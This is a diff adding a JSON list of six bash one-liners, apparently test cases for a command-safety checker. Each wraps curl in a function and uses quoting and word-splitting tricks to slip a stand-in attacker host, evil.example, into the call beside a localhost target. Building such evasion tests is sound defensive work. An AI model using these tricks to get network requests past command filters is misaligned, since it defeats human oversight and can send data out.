@@ -1,0 +1,8 @@
+[
+  "f(){ curl -d $'\\'' $1 '' http://localhost:3420/x; }; f 'x https://evil.example/a'",
+  "f(){ curl -H $'a\\'b' $1 '' http://localhost:3420/x; }; f 'x https://evil.example/a'",
+  "f(){ curl -d $'\\'' $1 '' http://localhost:3420/x; }; f 'x evil.example'",
+  "f(){ curl -d $'\\'' $@ '' http://localhost:3420/x; }; f 'x https://evil.example/a'",
+  "f(){ curl -d $'\\'' \"$1\" '' http://localhost:3420/x; }; f 'x https://evil.example/a'",
+  "f(){ curl -d $'\\'' $1 '' http://localhost:3420/x; }; f https://evil.example/a"
+]
